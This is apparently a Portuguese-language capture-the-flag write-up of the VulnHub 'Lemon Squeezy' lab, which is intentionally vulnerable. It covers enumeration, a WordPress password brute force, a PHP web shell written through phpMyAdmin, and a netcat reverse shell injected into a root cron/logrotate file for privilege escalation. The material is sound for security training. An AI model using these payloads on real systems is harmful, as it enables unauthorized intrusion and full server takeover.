---
title: "VulnHub - Lemon Squeezy"
tags: [Linux,Medium,Gobuster,Wordpress,Web]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/inicial.png)

Link: [Lemon Squeezy](https://www.vulnhub.com/entry/lemonsqueezy-1,473/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 1 porta aberta no servidor

> Porta 80 -> Web

## Enumeração da Porta 80

Abrimos pra ver do que se trata

É uma página padrão do apache

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/web.png)

Rodamos o Gobuster pra ver se encontramos algo

```bash
gobuster dir -u http://192.168.56.136/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/gobuster.png)

### Wordpress

Acessando o http://192.168.56.136/wordpress verificamos que tem wp rodando nesse servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/wp.png)

Olhando o código fonte, vemos que ele está chamando o `lemonsqueezy`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/wp1.png)

Alteramos o /etc/hosts pra podermos ver a webpage corretamente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/hosts.png)

Agora acessamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/wp2.png)

Bom, fiz diversas enumerações no wordpress e não encontrei nada de extremamente vulnerável nele

Com o `wpscan` enumeramos algumas coisas

```bash
wpscan --url http://lemonsqueezy/wordpress/ -e u --no-banner --no-update --api-token [....]
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/wp3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/wp4.png)

Usuários encontrados: **oragen** e **lemon**, com eles podemos tentar algum tipo de brute force na máquina depois também. Tirando isso não encontrei nada de importante nesse wordpress

### /javascript

Enumeramos então esse /javascript

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/java.png)

Gosbuster nele

```bash
gobuster dir -u http://lemonsqueezy/javascript/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/java1.png)

Acessamos esse /scriptaculous

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/java2.png)

Bom, não vou ficar batendo aqui pq é um rabbit hole

## Wordpress Brute Force

```bash
wpscan --url http://lemonsqueezy/wordpress --passwords /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt --usernames lemon,orange
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/brute.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/brute1.png)

Opa, encontramos um login e senha válido `Username: orange, Password: ginger`

## Login Wordpress

Entramos no Wordpress

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/login.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/login1.png)

Verificamos um post interessante que tem o que parece ser uma senha, vamos salvar pra se precisarmos no futuro, usar ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/wp5.png)

`n0t1n@w0rdl1st!`

Não conseguimos RCE nesse Wordpress

## Login phpmyadmin

Já que não conseguimos nada ai, vamos tentar entrar no phpmyadmin que também temos disponível nele, e tentar RCE ali

Tentamos com essa senha nova que encontramos...

orange:n0t1n@w0rdl1st!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/php.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/php1.png)

select "<?php echo shell_exec($_GET['cmd']);?>" into outfile '/var/www/html/wordpress/shell.php'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/php2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/php3.png)

Testamos o RCE, e temos!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/php4.png)

# www-data - Root

Agora pegamos um shell de www-data

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/rev.png)

Rodamos o linpeas para buscar pontos de escalação de privilégios

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/lin.png)

Baixamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/lin1.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/lin3.png)

Encontramos uma cron sendo executado a cada 2 min, como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/lin2.png)

Verificamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/log.png)

Vemos que podemos escrever nesse arquivo, então agora ficou fácil de fazer o nosso reverse shell

```bash
echo -n "os.system('nc -e /bin/bash 192.168.56.102 443')" >> /etc/logrotate.d/logrotate
```

Adicionamos nosso shell reverso e esperamos a conexão vir

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/root.png)

Pegamos as duas flags

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/flag.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lemonsqueezy/flag1.png)
